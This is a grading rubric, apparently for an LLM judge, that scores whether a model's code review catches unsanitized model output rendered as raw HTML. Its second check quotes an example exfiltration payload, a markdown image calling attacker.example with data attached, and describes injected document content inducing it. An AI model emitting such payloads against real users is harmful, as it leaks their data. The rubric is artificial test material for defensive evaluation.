---
type: llm
focus: last_message
---
Check each claim:
1. The answer identifies that `markdown(answer)` (model output) is returned as raw HTML without sanitizing.
2. It names a concrete consequence: XSS in the user's browser, and/or data exfiltration through image or link URLs (e.g. `![](https://attacker.example/?d=...)`) induced by injected document content.
3. It rates it Medium, High or Critical.
4. It gives a specific fix (sanitize with an allowlist, escape HTML, strip or proxy external images/links, or a restrictive CSP).
PASS only if all four hold.
